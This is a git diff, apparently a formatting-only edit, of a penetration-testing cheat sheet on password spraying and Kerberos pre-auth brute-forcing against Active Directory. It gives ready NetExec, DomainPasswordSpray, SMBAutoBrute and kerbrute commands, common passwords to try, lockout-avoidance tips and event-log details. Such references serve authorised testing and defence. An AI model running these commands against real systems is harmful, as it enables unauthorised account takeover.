@@ -1,8 +1,8 @@
 # Password - Spraying
 
-Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. 
+Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password.
 
-> The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. 
+> The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates.
 
 Most of the time the best passwords to spray are :
 
@@ -15,10 +15,10 @@ Most of the time the best passwords to spray are :
 
 :warning: be careful with the account lockout !
 
-
 ## Spray a pre-generated passwords list
 
-* Using [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
+- Using [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
+
   ```powershell
   nxc smb 10.0.0.1 -u /path/to/users.txt -p Password123
   nxc smb 10.0.0.1 -u Administrator -p /path/to/passwords.txt
@@ -36,23 +36,25 @@ Most of the time the best passwords to spray are :
   nxc nfs targets.txt -u Administrator -p Password123
   ```
 
-* Using [hashcat/maskprocessor](https://github.com/hashcat/maskprocessor) to generate passwords following a specific rule
+- Using [hashcat/maskprocessor](https://github.com/hashcat/maskprocessor) to generate passwords following a specific rule
+
   ```powershell
   nxc smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
   ```
 
-* Using [dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) to spray a password against all users of a domain.
+- Using [dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) to spray a password against all users of a domain.
+
   ```powershell
   Invoke-DomainPasswordSpray -Password Summer2021!
   Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
   ```
 
-* Using [shellntel-acct/scripts/SMBAutoBrute](https://github.com/shellntel-acct/scripts/blob/master/Invoke-SMBAutoBrute.ps1).
+- Using [shellntel-acct/scripts/SMBAutoBrute](https://github.com/shellntel-acct/scripts/blob/master/Invoke-SMBAutoBrute.ps1).
+
   ```powershell
   Invoke-SMBAutoBrute -PasswordList "jennifer, yankees" -LockoutThreshold 3
   Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
   ```
-
 
 ## BadPwdCount attribute
 
@@ -64,22 +66,26 @@ LDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastS
 LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: <never>
 ```
 
-
 ## Kerberos pre-auth bruteforcing
 
 Using [ropnop/kerbrute](https://github.com/ropnop/kerbrute), a tool to perform Kerberos pre-auth bruteforcing.
 
 > Kerberos pre-authentication errors are not logged in Active Directory with a normal **Logon failure event (4625)**, but rather with specific logs to **Kerberos pre-authentication failure (4771)**.
 
-* Username bruteforce
+- Username bruteforce
+
   ```powershell
   ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt
   ```
-* Password bruteforce
+
+- Password bruteforce
+
   ```powershell
   ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username
   ```
-* Password spray
+
+- Password spray
+
   ```powershell
   ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
   ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
